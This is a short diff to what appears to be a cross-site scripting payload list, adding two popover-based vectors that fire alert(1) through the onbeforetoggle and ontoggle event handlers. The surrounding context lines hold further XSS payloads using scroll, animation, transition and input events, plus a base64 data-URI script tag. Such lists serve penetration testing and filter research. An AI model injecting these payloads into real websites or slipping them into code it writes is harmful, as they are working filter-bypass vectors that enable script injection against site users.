@@ -950,6 +950,8 @@ code
 <body onwheel=alert(1)>
 <* contenteditable onbeforeinput=alert(1)>test
 <* onscrollend=alert(1) style=\"display:block;overflow:auto;border:1px dashed;width:500px;height:100px;\"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test<\/span><\/*>
+<button popovertarget=x>Click me</button><* onbeforetoggle=alert(1) popover id=x>XSS<\/*>
+<button popovertarget=x>Click me</button><* ontoggle=alert(1) popover id=x>XSS<\/*>
 <xss class=progress-bar-animated onanimationstart=alert(1)>
 <xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>
 <script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>
